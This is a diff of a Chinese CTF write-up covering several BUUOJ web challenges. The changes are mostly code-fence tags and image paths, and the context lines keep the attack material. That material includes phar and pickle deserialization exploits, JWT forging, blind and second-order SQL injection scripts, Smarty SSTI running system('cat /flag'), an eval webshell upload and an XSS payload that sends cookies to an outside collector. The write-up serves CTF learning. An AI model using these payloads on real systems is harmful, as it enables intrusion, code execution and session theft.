@@ -20,7 +20,7 @@ categories:
 
 <!--more-->
 
-```
+```php+HTML
 //index.php
 <?php
 session_start();
@@ -67,7 +67,7 @@ $a->Size();
 ?>
 ```
 
-```
+```php+HTML
 //download.php
 <?php
 session_start();
@@ -97,7 +97,7 @@ if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag
 
 ```
 
-```
+```php+HTML
 //delete.php
 <?php
 session_start();
@@ -128,7 +128,7 @@ if (strlen($filename) < 40 && $file->open($filename)) {
 ?>
 ```
 
-```
+```php+HTML
 //register.php
 <?php
 session_start();
@@ -206,7 +206,7 @@ if (isset($_POST["username"]) && isset($_POST["password"])) {
 ?>
 ```
 
-```
+```php+HTML
 //class.php
 <?php
 error_reporting(0);
@@ -353,7 +353,7 @@ class File {
 ?>
 ```
 
-```
+```php+HTML
 //login.php
 <?php
 session_start();
@@ -442,7 +442,7 @@ if (isset($_POST["username"]) && isset($_POST["password"])) {
 
 在class.php中，File::close()可以读取到文件内容
 
-```
+```php
 class File {
     public $filename;
 
@@ -456,7 +456,7 @@ class File {
 
 User类中的析构函数中有执行close()函数过程
 
-```
+```php
 class User {
     public $db;
 
@@ -475,7 +475,7 @@ class User {
 
 而FileList类中没有close()函数，但是如果调用FileList类中的close（）,就会调用到File类中的close()。从而获取flag的内容
 
-```
+```php
 class FileList {
     private $files;
     private $results;
@@ -520,7 +520,7 @@ class FileList {
 
 编写生成phar的脚本
 
-```
+```php
 <?php
 class User
 {
@@ -559,7 +559,7 @@ $phar->stopBuffering();
 
 将生成的s.phar改后缀为gif，上传，在删除s.gif时，抓包修改filename为`phar://s.gif`
 
-![](../pic/74.png)
+![](/pic/74.png)
 
 
 
@@ -569,15 +569,15 @@ $phar->stopBuffering();
 
 回到首页发现要买到LV6
 
-![](../pic/75.png)
+![](/pic/75.png)
 
 在第181页找到了LV6点击购买
 
-![](../pic/76.png)
+![](/pic/76.png)
 
 抓包发现有一个价格，有一个折扣
 
-```
+```http
 POST /shopcar HTTP/1.1
 Host: c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
@@ -597,36 +597,36 @@ _xsrf=2%7C83e3992c%7C439e302fbcbed1836ddc3daad3af3599%7C1581661272&id=1624&price
 
 把价格改成很小发现出错，把折扣改小出现新界面提示需要admin才能访问
 
-![](../pic/77.png)
+![](/pic/77.png)
 
-![](../pic/78.png)
+![](/pic/78.png)
 
 查看cookie，其中有一个JWT、_xsrf、commodity_id
 
 [关于JWT](https://blog.csdn.net/hekewangzi/article/details/72885670)   去jwt.io解析一下
 
-![](../pic/79.png)
+![](/pic/79.png)
 
 使用的是HS256（HMAC SHA256对称加密）算法
 
 使用c-jwt-cracker破解成功，密钥为1Kun
 
-```
+```bash
 root@kali:~/tools/c-jwt-cracker# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78
 Secret is "1Kun"
 ```
 
 回到https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun
 
-![](../pic/80.png)  
+![](/pic/80.png)  
 
 然后修改cookie为`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo`
 
-![](../pic/81.png)  
+![](/pic/81.png)  
 
 点击页面无反应，查看源码，发现了一个WWW.ZIP
 
-![](../pic/82.png)  
+![](/pic/82.png)  
 
 打开发现是tornado的框架
 
@@ -634,9 +634,9 @@ Secret is "1Kun"
 
 在sshop/view/Admin.py中含有序列化漏洞
 
-![](../pic/83.png)
+![](/pic/83.png)
 
-```
+```python
 import tornado.web
 from sshop.base import BaseHandler
 import pickle
@@ -663,7 +663,7 @@ class AdminHandler(BaseHandler):
 
 编写exp
 
-```
+```python
 import pickle
 import urllib
 
@@ -681,7 +681,7 @@ if __name__ == '__main__':
 
 在BP中修改post中的become数据
 
-![](../pic/84.png)
+![](/pic/84.png)
 
 
 
@@ -700,7 +700,7 @@ Disallow: *.php.bak
 
 访问/image.php.bak得到源码
 
-```
+```php
 <﻿?php
 include "config.php";
 
@@ -732,7 +732,7 @@ addslashes() 返回字符串，该字符串为了数据库查询语句等的需�
 
 编写盲注脚本
 
-```
+```python
 # -*- coding: utf-8 -*-
 # @Time    : 2/14/2020 8:39 PM
 import requests
@@ -829,7 +829,7 @@ Content-Disposition: form-data; name="file"; filename="<?= eval($_POST['cmd']) ?
 
 菜刀连接，flag在根目录，打开即可
 
-![](../pic/85.png)
+![](/pic/85.png)
 
 
 
@@ -837,7 +837,7 @@ Content-Disposition: form-data; name="file"; filename="<?= eval($_POST['cmd']) ?
 
 打开题目，有一段代码，还给出了源码地址，下载整个源码，进行代码审计
 
-```
+```php
  <?php
 //backup in source.tar.gz
 
@@ -863,37 +863,37 @@ class IndexController extends Controller
 
 先搜索__destruct，发现很多里面都是空的
 
-![](../pic/86.png)
+![](/pic/86.png)
 
 后面在`vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php`找到一个
 
-![](../pic/87.png)
+![](/pic/87.png)
 
 查看`invalidateTags`方法的定义
 
-![](../pic/88.png)
+![](/pic/88.png)
 
 其中有一个`saveDeferred`，全局搜索看看，找到了`vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php`
 
-![](../pic/89.png)
+![](/pic/89.png)
 
 接着看`dosave`，就在当前页面的下面
 
-![](../pic/90.png)
+![](/pic/90.png)
 
 此处存在动态调用可以调用到`system()`
 
-![](../pic/91.png)
+![](/pic/91.png)
 
 `$this->setInnerItem`可控，`$innerItem`是我们传入的`$item`类中的`$innerItem`属性
 
 这里可以看到有 **$item[“\0\*\0expiry”]**、**$item[“\0\*\0poolHash”]** 这种写法，数组键名带有 **\0\*\0** 。这实际上是类中，修饰符为 **protected** 的属性，在类强转成数组之后的结果
 
-![](../pic/92.png)
+![](/pic/92.png)
 
 构造payload
 
-```
+```php
 <?php
 namespace Symfony\Component\Cache;
 class CacheItem 
@@ -931,7 +931,7 @@ payload
 ?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D
 ```
 
-![](../pic/93.png)
+![](/pic/93.png)
 
 
 
@@ -959,7 +959,7 @@ payload=/index.php?file=php://filter/convert.base64-encode/resource=index.php
 
 读取成功
 
-```
+```php+HTML
 //index.php
 <?php
 
@@ -1039,7 +1039,7 @@ if (isset($file)){
 <!--?file=?-->
 ```
 
-```
+```php+HTML
 //search.php
 <?php
 
@@ -1135,7 +1135,7 @@ if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
 </html>
 ```
 
-```
+```php+HTML
 //change.php
 <?php
 
@@ -1236,7 +1236,7 @@ if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["ph
 </html>
 ```
 
-```
+```php+HTML
 //delete.php
 <?php
 
@@ -1332,7 +1332,7 @@ if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
 </html>
 ```
 
-```
+```php+HTML
 //config.php
 <?php
 
@@ -1349,7 +1349,7 @@ $DATABASE = array(
 $db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']);
 ```
 
-```
+```php+HTML
 //confirm.php
 <?php
 
@@ -1447,7 +1447,7 @@ if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["ph
 
 因为在confirm.php中在存入的过程中使用了bind_param函数，所以无法绕过。在change.php将之前存入的地址拿来出来，存在二次注入。
 
-```
+```http
 POST /confirm.php HTTP/1.1
 Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
@@ -1464,7 +1464,7 @@ Upgrade-Insecure-Requests: 1
 user_name=1&phone=1&address=1'  where user_id=(updatexml(0,concat(0,(select load_file('/flag.txt'))),0))#
 ```
 
-```
+```http
 POST /change.php HTTP/1.1
 Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
@@ -1487,9 +1487,9 @@ user_name=1&phone=1&address=1
 errorXPATH syntax error: 'flag{e9485017-ebf4-4ea4-8579-daa'
 ```
 
-显示不全，再你想输出一下
+显示不全，再逆向输出一下
 
-```
+```http
 POST /confirm.php HTTP/1.1
 Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
@@ -1506,7 +1506,7 @@ Upgrade-Insecure-Requests: 1
 user_name=1&phone=1&address=1'  where user_id=(updatexml(0,concat(0,(select reverse(load_file('/flag.txt')))),0))#
 ```
 
-```
+```http
 POST /change.php HTTP/1.1
 Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
@@ -1540,21 +1540,21 @@ errorXPATH syntax error: '
 
 打开题目，页面说提供了查询公网IP的api,右上角还有显示IP，于是在头部加入X-Forwarded-For
 
-![](../pic/94.png)
+![](/pic/94.png)
 
 可能存在SSTI，测试一下的确存在SSTI
 
-![](../pic/96.png)
+![](/pic/96.png)
 
 在网页的最下方发现了**Build With Smarty** 
 
 一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 3.1.30
 
-![](../pic/97.png)
+![](/pic/97.png)
 
 Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是Smarty3.0手册说已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。发现报错了
 
-![](../pic/98.png)
+![](/pic/98.png)
 
 {literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。
 
@@ -1570,7 +1570,7 @@ marty的`{if}`条件判断和PHP的[if](http://php.net/if) 非常相似，只是
 
 将X-Forwarded-For头改为{if phpinfo()}{/if}可以查看phpinfo
 
-![](../pic/99.png)
+![](/pic/99.png)
 
 {if system('cat /flag')}{/if}即可获取到flag
 
@@ -1582,11 +1582,11 @@ marty的`{if}`条件判断和PHP的[if](http://php.net/if) 非常相似，只是
 
 使用御剑扫描发现login.php，admin.php
 
-![](../pic/100.png)
+![](/pic/100.png)
 
 访问admin.php，发现要admin才访问，去login.php注册一个账号，然后登入，有一个投稿
 
-![](../pic/101.png)
+![](/pic/101.png)
 
 明显的提示这题是XSS
 
@@ -1594,7 +1594,7 @@ marty的`{if}`条件判断和PHP的[if](http://php.net/if) 非常相似，只是
 
 来自赵师傅的payload     svg标签 ：xml自动解析html实体编码
 
-```
+```php
 in_str = "(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&id=dzWPkK&keepsession=0&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();"
 output = ""
 for c in in_str:
@@ -1604,13 +1604,13 @@ print("<svg><script>eval&#40&#34" + output + "&#34&#41</script>")
 
 得到地址后去commitbug.php（反馈）页面提交url
 
-![](../pic/102.png)
+![](/pic/102.png)
 
 url中要将*.buuoj.cn改成web
 
 附上碰撞的脚本，发现使用python编写会出错（字符与MD5对应不上）
 
-```
+```php
 <?php
 
 for($a=0;substr(md5($a),0,6)!='2ccf73';$a++){}
@@ -1621,17 +1621,17 @@ echo $a;
 ?>
 ```
 
-去xss平台手cookie
+去xss平台收cookie
 
-![](../pic/103.png)
+![](/pic/103.png)
 
 修改cookie为收到的cookie，访问admin.php   存在sql注入
 
-![](../pic/104.png)![](../pic/105.png)
+![](/pic/104.png)![](/pic/105.png)
 
 编写注入脚本
 
-```
+```python
 # -*- coding: utf-8 -*-
 # @Time    : 2/19/2020 12:34 AM
 import requests
@@ -1724,11 +1724,11 @@ get_data('flagg','flag') #flag{88331b80-7fb8-4f2f-9fa1-a4b85bd8562d}
 
 传入参数?secret=123456789后报错
 
-![](../pic/106.png)
+![](/pic/106.png)
 
 发现是flask框架，点开/app/app.py后有如下代码
 
-```
+```python
 File "/app/app.py", line 35, in secret
 
     if(secret==None):
@@ -1745,7 +1745,7 @@ File "/app/app.py", line 35, in secret
  [Open an interactive python shell in this frame]  
 
     if 'ciscn' in a.lower():
-
+python
         return 'flag detected!'
 
     return a
@@ -1753,7 +1753,7 @@ File "/app/app.py", line 35, in secret
 
 是RC4加密，RC4算法加密又是解密将payload加密就好
 
-```
+```python
 # -*- coding: utf-8 -*-
 # @Time    : 2/25/2020 11:38 PM
 import urllib
